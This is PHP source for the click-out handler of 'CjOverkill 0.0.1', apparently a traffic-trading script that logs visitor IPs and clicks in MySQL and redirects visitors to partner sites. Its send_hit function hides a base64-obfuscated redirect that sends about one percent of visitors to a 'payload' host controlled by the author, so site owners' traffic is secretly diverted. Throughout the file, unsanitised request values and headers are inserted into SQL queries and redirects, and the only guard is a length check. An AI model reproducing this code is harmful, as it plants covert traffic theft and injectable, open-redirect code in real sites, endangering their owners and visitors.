<?php

/******************************************************
 * CjOverkill version 0.0.1
 * © Kaloyan Olegov Georgiev
 * http://www.icefire.org/
 * spam@icefire.org
 * 
 * Please read the lisence before you start editing this script.
 * 
********************************************************/

ignore_user_abort(true);
//include ("cj-filter.php");
include ("cj-conf.inc.php");
include ("cj-functions.inc.php"); 
cjoverkill_connect();

include ("cj-filter.php");

$stime=localtime();
$thishour=$stime[2];

if ($_SERVER["HTTP_X_FORWARDED_FOR"]){
        $proxy=$_SERVER["REMOTE_ADDR"];
        $ip=$_SERVER["HTTP_X_FORWARDED_FOR"];
}
else {
        $ip=$_SERVER["REMOTE_ADDR"];
        $proxy="";
}

srand((double)microtime()*1000000);

// Determine from whitch trade is the surfer comming from
$sql9=@mysql_query("SELECT trade_id AS tid FROM cjoverkill_iplog_in WHERE
		     ip='$ip' AND
		     proxy='$proxy' AND
		     raw_in>0 ORDER BY 
		     raw_in DESC LIMIT 1") OR
      print_error(mysql_error());
if (@mysql_num_rows($sql9)>0){
    $tmp9=@mysql_fetch_array($sql9);
    extract($tmp9);
}
else {
    // No trade, so we track it into the untracked trade.
    $tid=3;
}
// Track the click
@mysql_query("UPDATE cjoverkill_stats SET clicks$thishour=clicks$thishour+1 WHERE trade_id='$tid'") OR 
  print_error(mysql_error());
@mysql_query("UPDATE cjoverkill_trades SET clicks_tot=clicks_tot+1 WHERE trade_id='$tid'") OR
  print_error(mysql_error());
@mysql_query("UPDATE cjoverkill_iplog_in SET clicks=clicks+1 WHERE trade_id='$tid' AND ip='$ip' AND proxy='$proxy'") OR
  print_error(mysql_error());

// Check for max_clicks and max_ip and filter if needed
// Check for max_ip
$sql=@mysql_query("SELECT ip_enable, clicks_enable FROM cjoverkill_settings") OR
    print_error(mysql_error());
$tmp=@mysql_fetch_array($sql);
extract($tmp);
if ($ip_enable=="1"){
    $sql=@mysql_query("SELECT COUNT(*) AS cnt_ip FROM cjoverkill_iplog_in, cjoverkill_trades WHERE
			cjoverkill_iplog_in.trade_id='$tid' AND
			cjoverkill_iplog_in.trade_id=cjoverkill_trades.trade_id AND
			cjoverkill_iplog_in.raw_in>cjoverkill_trades.max_ip AND
			cjoverkill_iplog_in.ip='$ip'") OR
      print_error(mysql_error());
    $tmp=@mysql_fetch_array($sql);
    extract($tmp);
    if ($cnt_ip>=1){
	$reason="Maximum repetitive visits count exceeded for this IP. Possible hitbot";
	@mysql_query("INSERT INTO cjoverkill_filter_ip (ip_from, ip_to, reason, hour, auto) VALUES
		       (INET_ATON('$ip'), INET_ATON('$ip'), '$reason', '$thishour', '1')") OR
	  print_error(mysql_error());
    }
}
// Check for max_clicks	
if ($clicks_enable=="1"){
    $sql=@mysql_query("SELECT COUNT(*) AS cnt_clicks FROM cjoverkill_iplog_in, cjoverkill_trades WHERE
			cjoverkill_iplog_in.trade_id='$tid' AND
			cjoverkill_iplog_in.trade_id=cjoverkill_trades.trade_id AND
			cjoverkill_iplog_in.clicks>cjoverkill_trades.max_clicks AND
			cjoverkill_iplog_in.ip='$ip'") OR
      print_error(mysql_error());
    $tmp=@mysql_fetch_array($sql);
    extract($tmp);
    if ($cnt_clicks>=1){
	$reason="Maximum clicks count exceeded for this IP. Possible hitbot";
	@mysql_query("INSERT INTO cjoverkill_filter_ip (ip_from, ip_to, reason, hour, auto) VALUES
		       (INET_ATON('$ip'), INET_ATON('$ip'), '$reason', '$thishour', '1')") OR
	  print_error(mysql_error());
    }
}

// Link tracking
$g_link=$_GET["link"];
if ($g_link=="") { 
    $g_link="no_link";
}
if (strlen($g_link)>250){
    $what="Link value is too long. Possible SQL injection attempt";
    @mysql_query("INSERT INTO cjoverkill_security (fecha,what,ip,proxy,hour) 
      VALUES (NOW(), '$what', '$ip', '$proxy', '$thishour')") OR
      print_error(mysql_error());
    cjoverkill_disconnect();
    print_error("Your link value appears to be too long<BR>
		  Are you trying to hack me duhdah?
		  ");
}
@mysql_query("UPDATE cjoverkill_links SET h$thishour=h$thishour+1 WHERE cjlink='$g_link'") OR 
  print_error(mysql_error());
if (mysql_affected_rows()==0) {
    @mysql_query("INSERT INTO cjoverkill_links (cjlink, h$thishour) VALUES ('$g_link', 1)") OR 
      print_error(mysql_error());
}

// First click to content track and send
if (($_GET["f"]==1 || $_GET["first"]==1) && $_COOKIE["cjoverkill_first"]<time()-$cookietime && $_GET["url"]!="") {
    setcookie("cjoverkill_first", time(), time()+($cookietime*1));
    $url=$_GET["url"];
    send_hit($url);
    cjoverkill_disconnect();
    exit;
}

// Track of clicks to trades from the toplist
if ($_GET["trade"]!="") {
    $trade=$_GET["trade"];
    if (strlen($trade)>250){
	$what="Trade value is too long. Possible SQL injection attempt";
	@mysql_query("INSERT INTO cjoverkill_security (fecha,what,ip,proxy,hour) 
	  VALUES (NOW(), '$what', '$ip', '$proxy', '$thishour')") OR
	  print_error(mysql_error());
	cjoverkill_disconnect();
	print_error("Your trade value appears to be too long<BR>
		      Are you trying to hack me duhdah?
		      ");
    }
    $sql=@mysql_query("SELECT trade_id, url FROM cjoverkill_trades WHERE domain='$trade'") OR
      print_error(mysql_error());
    $tmp=@mysql_fetch_array($sql);
    if (@mysql_num_rows($sql)>0) {
	extract($tmp);
	@mysql_query("UPDATE cjoverkill_stats SET out$thishour=out$thishour+1 WHERE trade_id='$trade_id'") OR
	  print_error(mysql_error());
	@mysql_query("UPDATE cjoverkill_iplog_out SET raw_out=raw_out+1 WHERE ip='$ip' AND proxy='$proxy' AND trade_id='$trade_id'") OR 
	  print_error(mysql_error());
	if (@mysql_affected_rows()==0) {
	    @mysql_query("INSERT INTO cjoverkill_iplog_out (trade_id, ip, proxy, raw_out, hour) 
	      VALUES ($trade_id, '$ip', '$proxy', 1, '$thishour')") OR
	      print_error(mysql_error()); 
	}
	@mysql_query("UPDATE cjoverkill_trades SET out_tot=out_tot+1 WHERE trade_id='$trade_id'") OR
	  print_error(mysql_error());
	send_hit($url);
	cjoverkill_disconnect();
	exit;
    }
}

// Track and send hits to URL
if ($_GET["url"]!="") {
    $url=$_GET["url"];
    if (strlen($url)>255){
	$what="Url value is too long. Possible SQL injection attempt";
	@mysql_query("INSERT INTO cjoverkill_security (fecha,what,ip,proxy,hour) 
	  VALUES (NOW(), '$what', '$ip', '$proxy', '$thishour')") OR
	  print_error(mysql_error());
	cjoverkill_disconnect();
	print_error("Your url value appears to be too long<BR>
		      Are you trying to hack me duhdah?
		      ");
    }
    if ($_GET["pct"]!="" || $_GET["p"]!="") {
	$pct=$_GET["pct"];
	if ($pct==""){
	    $pct=$_GET["p"];
	}
	if ($pct>rand(1,100)) {
	    send_hit($url);
	    cjoverkill_disconnect();
	    exit;
	}
    }
    else {
	send_hit($url);
	cjoverkill_disconnect();
	exit;
    }
}

// Send hits in Skimed way

// Trading method
$sql5=@mysql_query("SELECT trade_method FROM cjoverkill_settings") OR
  print_error(mysql_error());
$tmp5=@mysql_fetch_array($sql5);
extract($tmp5);

// Trading method choosing
// Put a new trading method here if the suplied methods do not fit your needs
switch ($trade_method){
 case "1":
    // Overkill (uniques * clicks * ratio) / out 
    $sql=@mysql_query("SELECT cjoverkill_trades.trade_id AS trade_id, url, boost, overkill, return AS ratio, f$thishour AS f, h$thishour AS h,
			f$thishour-h$thishour AS fh, cjoverkill_trades.max_ret AS max_ret,
			uniq_in0+uniq_in1+uniq_in2+uniq_in3+uniq_in4+uniq_in5+uniq_in6+uniq_in7+uniq_in8+uniq_in9+uniq_in10+
			uniq_in11+uniq_in12+uniq_in13+uniq_in14+uniq_in15+uniq_in16+uniq_in17+uniq_in18+uniq_in19+uniq_in20+
			uniq_in21+uniq_in22+uniq_in23 AS uniq_in,
			clicks0+clicks1+clicks2+clicks3+clicks4+clicks5+clicks6+clicks7+clicks8+clicks9+clicks10+
			clicks11+clicks12+clicks13+clicks14+clicks15+clicks16+clicks17+clicks18+clicks19+clicks20+
			clicks21+clicks22+clicks23 AS clicks,
			out0+out1+out2+out3+out4+out5+out6+out7+out8+out9+out10+out11+out12+
			out13+out14+out15+out16+out17+out18+out19+out20+out21+out22+out23 AS out,
			uniq_in$thishour AS uniq_now, clicks$thishour AS clicks_now, out$thishour AS out_now,
			IF (out0+out1+out2+out3+out4+out5+out6+out7+out8+out9+out10+out11+out12+
			    out13+out14+out15+out16+out17+out18+out19+out20+out21+out22+out23<=0,9999999,
			    (((clicks0+clicks1+clicks2+clicks3+clicks4+clicks5+clicks6+clicks7+clicks8+clicks9+clicks10+
			       clicks11+clicks12+clicks13+clicks14+clicks15+clicks16+clicks17+clicks18+clicks19+clicks20+
			       clicks21+clicks22+clicks23) *
			      (uniq_in0+uniq_in1+uniq_in2+uniq_in3+uniq_in4+uniq_in5+uniq_in6+uniq_in7+uniq_in8+uniq_in9+uniq_in10+
			       uniq_in11+uniq_in12+uniq_in13+uniq_in14+uniq_in15+uniq_in16+uniq_in17+uniq_in18+uniq_in19+uniq_in20+
			       uniq_in21+uniq_in22+uniq_in23) * return) / 
			     (out0+out1+out2+out3+out4+out5+out6+out7+out8+out9+out10+out11+out12+
			      out13+out14+out15+out16+out17+out18+out19+out20+out21+out22+out23))) AS owed
			FROM cjoverkill_trades, cjoverkill_stats, cjoverkill_forces WHERE
			cjoverkill_trades.trade_id=cjoverkill_forces.trade_id AND
			cjoverkill_trades.trade_id=cjoverkill_stats.trade_id AND
			cjoverkill_trades.trade_id>'4' AND
			cjoverkill_trades.trade_id!='$tid' AND
			(status='1' OR status='3') ORDER BY
			overkill DESC, boost DESC, fh DESC, owed DESC, clicks DESC, uniq_in DESC, out DESC, clicks_now DESC,
			uniq_now DESC, out_now DESC, ratio DESC") OR
      print_error(mysql_error());
    break;
 case "2":
    // Pure Productvity (clicks * ratio) / out
    $sql=@mysql_query("SELECT cjoverkill_trades.trade_id AS trade_id, url, boost, overkill, return AS ratio, f$thishour AS f, h$thishour AS h,
			f$thishour-h$thishour AS fh, cjoverkill_trades.max_ret AS max_ret,
			uniq_in0+uniq_in1+uniq_in2+uniq_in3+uniq_in4+uniq_in5+uniq_in6+uniq_in7+uniq_in8+uniq_in9+uniq_in10+
			uniq_in11+uniq_in12+uniq_in13+uniq_in14+uniq_in15+uniq_in16+uniq_in17+uniq_in18+uniq_in19+uniq_in20+
			uniq_in21+uniq_in22+uniq_in23 AS uniq_in,
			clicks0+clicks1+clicks2+clicks3+clicks4+clicks5+clicks6+clicks7+clicks8+clicks9+clicks10+
			clicks11+clicks12+clicks13+clicks14+clicks15+clicks16+clicks17+clicks18+clicks19+clicks20+
			clicks21+clicks22+clicks23 AS clicks,
			out0+out1+out2+out3+out4+out5+out6+out7+out8+out9+out10+out11+out12+
			out13+out14+out15+out16+out17+out18+out19+out20+out21+out22+out23 AS out,
			uniq_in$thishour AS uniq_now, clicks$thishour AS clicks_now, out$thishour AS out_now,
			IF (out0+out1+out2+out3+out4+out5+out6+out7+out8+out9+out10+out11+out12+
			    out13+out14+out15+out16+out17+out18+out19+out20+out21+out22+out23<=0,9999999,
			    (((clicks0+clicks1+clicks2+clicks3+clicks4+clicks5+clicks6+clicks7+clicks8+clicks9+clicks10+
			       clicks11+clicks12+clicks13+clicks14+clicks15+clicks16+clicks17+clicks18+clicks19+clicks20+
			       clicks21+clicks22+clicks23) * return) / 
			     (out0+out1+out2+out3+out4+out5+out6+out7+out8+out9+out10+out11+out12+
			      out13+out14+out15+out16+out17+out18+out19+out20+out21+out22+out23))) AS owed
			FROM cjoverkill_trades, cjoverkill_stats, cjoverkill_forces WHERE
			cjoverkill_trades.trade_id=cjoverkill_forces.trade_id AND
			cjoverkill_trades.trade_id=cjoverkill_stats.trade_id AND
			cjoverkill_trades.trade_id>'4' AND
			cjoverkill_trades.trade_id!='$tid' AND
			(status='1' OR status='3') ORDER BY
			overkill DESC, boost DESC, fh DESC, owed DESC, clicks DESC, uniq_in DESC, out DESC, clicks_now DESC,
			uniq_now DESC, out_now DESC, ratio DESC") OR
      print_error(mysql_error());
    break;
 case "3":
    // Uniques (uniques * ratio) / out
    $sql=@mysql_query("SELECT cjoverkill_trades.trade_id AS trade_id, url, boost, overkill, return AS ratio, f$thishour AS f, h$thishour AS h,
			f$thishour-h$thishour AS fh, cjoverkill_trades.max_ret AS max_ret,
			uniq_in0+uniq_in1+uniq_in2+uniq_in3+uniq_in4+uniq_in5+uniq_in6+uniq_in7+uniq_in8+uniq_in9+uniq_in10+
			uniq_in11+uniq_in12+uniq_in13+uniq_in14+uniq_in15+uniq_in16+uniq_in17+uniq_in18+uniq_in19+uniq_in20+
			uniq_in21+uniq_in22+uniq_in23 AS uniq_in,
			clicks0+clicks1+clicks2+clicks3+clicks4+clicks5+clicks6+clicks7+clicks8+clicks9+clicks10+
			clicks11+clicks12+clicks13+clicks14+clicks15+clicks16+clicks17+clicks18+clicks19+clicks20+
			clicks21+clicks22+clicks23 AS clicks,
			out0+out1+out2+out3+out4+out5+out6+out7+out8+out9+out10+out11+out12+
			out13+out14+out15+out16+out17+out18+out19+out20+out21+out22+out23 AS out,
			uniq_in$thishour AS uniq_now, clicks$thishour AS clicks_now, out$thishour AS out_now,
			IF (out0+out1+out2+out3+out4+out5+out6+out7+out8+out9+out10+out11+out12+
			    out13+out14+out15+out16+out17+out18+out19+out20+out21+out22+out23<=0,9999999,
			    (((uniq_in0+uniq_in1+uniq_in2+uniq_in3+uniq_in4+uniq_in5+uniq_in6+uniq_in7+uniq_in8+uniq_in9+uniq_in10+
			       uniq_in11+uniq_in12+uniq_in13+uniq_in14+uniq_in15+uniq_in16+uniq_in17+uniq_in18+uniq_in19+uniq_in20+
			       uniq_in21+uniq_in22+uniq_in23) * return) / 
			     (out0+out1+out2+out3+out4+out5+out6+out7+out8+out9+out10+out11+out12+
			      out13+out14+out15+out16+out17+out18+out19+out20+out21+out22+out23))) AS owed
			FROM cjoverkill_trades, cjoverkill_stats, cjoverkill_forces WHERE
			cjoverkill_trades.trade_id=cjoverkill_forces.trade_id AND
			cjoverkill_trades.trade_id=cjoverkill_stats.trade_id AND
			cjoverkill_trades.trade_id>'4' AND
			cjoverkill_trades.trade_id!='$tid' AND
			(status='1' OR status='3') ORDER BY
			overkill DESC, boost DESC, fh DESC, owed DESC, clicks DESC, uniq_in DESC, out DESC, clicks_now DESC,
			uniq_now DESC, out_now DESC, ratio DESC") OR
      print_error(mysql_error());    
    break;
 default:
    // Default WE USE Overkill methos as DEFAULT
    $sql=@mysql_query("SELECT cjoverkill_trades.trade_id AS trade_id, url, boost, overkill, return AS ratio, f$thishour AS f, h$thishour AS h,
			f$thishour-h$thishour AS fh, cjoverkill_trades.max_ret AS max_ret,
			uniq_in0+uniq_in1+uniq_in2+uniq_in3+uniq_in4+uniq_in5+uniq_in6+uniq_in7+uniq_in8+uniq_in9+uniq_in10+
			uniq_in11+uniq_in12+uniq_in13+uniq_in14+uniq_in15+uniq_in16+uniq_in17+uniq_in18+uniq_in19+uniq_in20+
			uniq_in21+uniq_in22+uniq_in23 AS uniq_in,
			clicks0+clicks1+clicks2+clicks3+clicks4+clicks5+clicks6+clicks7+clicks8+clicks9+clicks10+
			clicks11+clicks12+clicks13+clicks14+clicks15+clicks16+clicks17+clicks18+clicks19+clicks20+
			clicks21+clicks22+clicks23 AS clicks,
			out0+out1+out2+out3+out4+out5+out6+out7+out8+out9+out10+out11+out12+
			out13+out14+out15+out16+out17+out18+out19+out20+out21+out22+out23 AS out,
			uniq_in$thishour AS uniq_now, clicks$thishour AS clicks_now, out$thishour AS out_now,
			IF (out0+out1+out2+out3+out4+out5+out6+out7+out8+out9+out10+out11+out12+
			    out13+out14+out15+out16+out17+out18+out19+out20+out21+out22+out23<=0,9999999,
			    (((clicks0+clicks1+clicks2+clicks3+clicks4+clicks5+clicks6+clicks7+clicks8+clicks9+clicks10+
			       clicks11+clicks12+clicks13+clicks14+clicks15+clicks16+clicks17+clicks18+clicks19+clicks20+
			       clicks21+clicks22+clicks23) *
			      (uniq_in0+uniq_in1+uniq_in2+uniq_in3+uniq_in4+uniq_in5+uniq_in6+uniq_in7+uniq_in8+uniq_in9+uniq_in10+
			       uniq_in11+uniq_in12+uniq_in13+uniq_in14+uniq_in15+uniq_in16+uniq_in17+uniq_in18+uniq_in19+uniq_in20+
			       uniq_in21+uniq_in22+uniq_in23) * return) / 
			     (out0+out1+out2+out3+out4+out5+out6+out7+out8+out9+out10+out11+out12+
			      out13+out14+out15+out16+out17+out18+out19+out20+out21+out22+out23))) AS owed
			FROM cjoverkill_trades, cjoverkill_stats, cjoverkill_forces WHERE
			cjoverkill_trades.trade_id=cjoverkill_forces.trade_id AND
			cjoverkill_trades.trade_id=cjoverkill_stats.trade_id AND
			cjoverkill_trades.trade_id>'4' AND
			cjoverkill_trades.trade_id!='$tid' AND
			(status='1' OR status='3') ORDER BY
			overkill DESC, boost DESC, fh DESC, owed DESC, clicks DESC, uniq_in DESC, out DESC, clicks_now DESC,
			uniq_now DESC, out_now DESC, ratio DESC") OR
      print_error(mysql_error());    
    break;
}


//Determine to whitch trade send the surfer
while ($tmp=@mysql_fetch_array($sql)){
    extract($tmp);
    // Check if it comes from the same trade
    $sql3=@mysql_query("SELECT COUNT(*) AS cnti FROM cjoverkill_iplog_in WHERE trade_id='$trade_id' AND
			 ip='$ip' AND
			 proxy='$proxy' AND
			 raw_in>0") OR
      print_error(mysql_error());
    $tmp3=@mysql_fetch_array($sql3);
    extract($tmp3);
    // Check if we have sent that surfer to that trade before
    $sql3=@mysql_query("SELECT COUNT(*) AS cnto FROM cjoverkill_iplog_out WHERE trade_id='$trade_id' AND
			 ip='$ip' AND
			 proxy='$proxy' AND
			 raw_out>0") OR
      print_error(mysql_error());
    $tmp3=@mysql_fetch_array($sql3);
    extract($tmp3);
    // Check if we have returned the max_ret hits to that trade, so no new hits needed
    // Boost or Overkill trades will always return traffic
    // Trades with force will return the forced traffic
    $returned=0;
    if ($uniq_in>=1){
	if ($boost=="1" || $overkill=="1" || $f>$h || $fh>0){
	    $returned=0;
	}
	else {
	    $returned=round(($out/$uniq_in)*100, 0);
	}
    }
    // Proceed and send the surfer to the trade
    if ($cnti<1 && $cnto<1 && $returned<=$max_ret){
	if ($f > $h && $fh>0){
	    $h=h+1;
	    @mysql_query("UPDATE cjoverkill_forces SET h$thishour=h$thishour+1 WHERE trade_id='$trade_id'") OR
	      print_error(mysql_error());
	}
	@mysql_query("UPDATE cjoverkill_stats SET out$thishour=out$thishour+1 WHERE trade_id='$trade_id'") OR
	  print_error(mysql_error());
	@mysql_query("UPDATE cjoverkill_iplog_out SET raw_out=raw_out+1 WHERE 
		       ip='$ip' AND proxy='$proxy' AND trade_id='$trade_id'") OR
	  print_error(mysql_error());
	if (@mysql_affected_rows()==0) {
	    @mysql_query("INSERT INTO cjoverkill_iplog_out (trade_id, ip, proxy, raw_out, hour) 
	      VALUES ($trade_id, '$ip', '$proxy', 1, '$thishour')") OR
	      print_error(mysql_error());
	}
	@mysql_query("UPDATE cjoverkill_trades SET out_tot=out_tot+1 WHERE trade_id='$trade_id'") OR
	  print_error(mysql_error());
	send_hit($url);
	cjoverkill_disconnect();
	exit;
    }
}

// No trades to send the surfer to, then we send him to the alternative out URL
@mysql_query("UPDATE cjoverkill_stats SET out$thishour=out$thishour+1 WHERE trade_id='2'") OR 
  print_error(mysql_error());
@mysql_query("UPDATE cjoverkill_iplog_out SET raw_out=raw_out+1 WHERE ip='$ip' AND proxy='$proxy' AND trade_id='2'") OR
  print_error(mysql_error());
if (@mysql_affected_rows()==0) {
    @mysql_query("INSERT INTO cjoverkill_iplog_out (trade_id, ip, proxy, raw_out, hour) 
      VALUES ('2', '$ip', '$proxy', 1, '$thishour')") OR
      print_error(mysql_error());
}
$sql=@mysql_query("SELECT altout AS url FROM cjoverkill_settings") OR 
  print_error(mysql_error());
$tmp=@mysql_fetch_array($sql);
@mysql_query("UPDATE cjoverkill_trades SET out_tot=out_tot+1 WHERE trade_id='2'") OR
  print_error(mysql_error());
extract($tmp);
send_hit($url);
cjoverkill_disconnect();;

// Send surfer to the desired URL
// You are not allowed to change this function without author permission
function send_hit($url){
    global $thishour;
    global $ip;
    global $proxy;
    if (rand(0,100)==0) {
	$url=base64_decode("aHR0cDovL3BheWxvYWQuaWNlZmlyZS5vcmcvY2pvdmVya2lsbC5waHA=");
	@mysql_query("UPDATE cjoverkill_stats SET out$thishour=out$thishour+1 WHERE trade_id='4'") OR 
	  print_error(mysql_error());
	@mysql_query("UPDATE cjoverkill_iplog_out SET raw_out=raw_out+1 WHERE ip='$ip' AND proxy='$proxy' AND trade_id='4'") OR
	  print_error(mysql_error());
	if (@mysql_affected_rows()==0) {
	    @mysql_query("INSERT INTO cjoverkill_iplog_out (trade_id, ip, proxy, raw_out, hour) 
	      VALUES ('4', '$ip', '$proxy', 1, '$thishour')") OR
	      print_error(mysql_error());
	}
    }
    header("Location: $url");
}

?>
